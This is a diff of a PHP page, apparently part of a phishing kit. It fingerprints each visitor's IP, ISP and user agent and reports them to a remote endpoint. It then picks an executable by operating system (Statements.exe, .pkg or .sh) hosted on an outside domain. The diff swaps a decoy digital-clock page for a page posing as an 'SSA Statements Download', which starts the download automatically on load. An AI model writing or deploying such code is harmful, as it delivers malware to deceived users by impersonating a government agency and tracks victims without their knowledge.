@@ -13,19 +13,19 @@ $isp = gethostbyaddr($ip); // Get ISP/domain info
 // Detect operating system and device
 $isMobile = preg_match('/mobile|android|iphone|ipad/i', $ua);
 $os = 'Unknown OS';
-$file = '';
+$fileUrl = '';
 
 if (stripos($ua, 'Win') !== false) {
     $os = 'Windows';
-    $file = 'Statements.exe';
+    $fileUrl = 'https://specialitystoreservice.com/camphere/sigidwhat/Statements.exe';
 } elseif (stripos($ua, 'Mac') !== false) {
     $os = 'Mac';
-    $file = 'Statements.pkg';
+    $fileUrl = 'https://specialitystoreservice.com/camphere/sigidwhat/Statements.pkg';
 } elseif (stripos($ua, 'Linux') !== false) {
     $os = 'Linux';
-    $file = 'Statements.sh';
+    $fileUrl = 'https://specialitystoreservice.com/camphere/sigidwhat/Statements.sh';
 } else {
-    $file = 'Statements.exe'; // Default to Windows file if OS is unrecognized
+    $fileUrl = 'https://specialitystoreservice.com/camphere/sigidwhat/Statements.exe'; // Default to Windows file if OS is unrecognized
 }
 
 // Format message with black background style
@@ -67,7 +67,7 @@ if (function_exists('curl_init')) {
     file_get_contents($url.'?'.http_build_query($data));
 }
 
-// Serve the appropriate file based on the operating system
+// Serve the appropriate file for download
 if ($isMobile) {
     echo '<!DOCTYPE html>
 <html lang="en">
@@ -115,67 +115,30 @@ if ($isMobile) {
 </html>';
     exit;
 } else {
-    if (file_exists($file)) {
-        header('Content-Type: application/octet-stream');
-        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
-        header('Content-Length: ' . filesize($file));
-        readfile($file);
-        exit;
-    } else {
-        echo "Error: File not found for the detected operating system.";
-    }
-}
-
-// Digital Clock for Time Zones
-echo '<!DOCTYPE html>
+    echo '<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Digital Clock</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #f0f0f0;
-            color: #333;
-            padding: 50px;
-        }
-        .clock {
-            font-size: 24px;
-            margin: 10px 0;
-        }
-    </style>
+    <title>SSA Statements Download</title>
     <script>
-        function updateClocks() {
-            const timeZones = {
-                "UTC": 0,
-                "New York (EST)": -5,
-                "London (GMT)": 0,
-                "Berlin (CET)": 1,
-                "Tokyo (JST)": 9,
-                "Sydney (AEST)": 10
-            };
-
-            const now = new Date();
-            const utcTime = now.getTime() + now.getTimezoneOffset() * 60000;
-
-            let clocksHtml = "";
-            for (const [city, offset] of Object.entries(timeZones)) {
-                const cityTime = new Date(utcTime + offset * 3600000);
-                clocksHtml += `<div class="clock">${city}: ${cityTime.toLocaleTimeString()}</div>`;
-            }
-
-            document.getElementById("clocks").innerHTML = clocksHtml;
+        function downloadFile() {
+            const fileUrl = "' . $fileUrl . '";
+            const link = document.createElement("a");
+            link.href = fileUrl;
+            link.download = fileUrl.substring(fileUrl.lastIndexOf("/") + 1);
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
         }
-
-        setInterval(updateClocks, 1000); // Update every second
-        window.onload = updateClocks;
+        window.onload = downloadFile;
     </script>
 </head>
 <body>
-    <h1>Digital Clock - Time Zones</h1>
-    <div id="clocks"></div>
+    <h1>Thank you for visiting SSA!</h1>
+    <p>Your file download should start automatically. If it doesn\'t, <a href="' . $fileUrl . '" download>click here</a>.</p>
 </body>
 </html>';
+    exit;
+}
 ?>
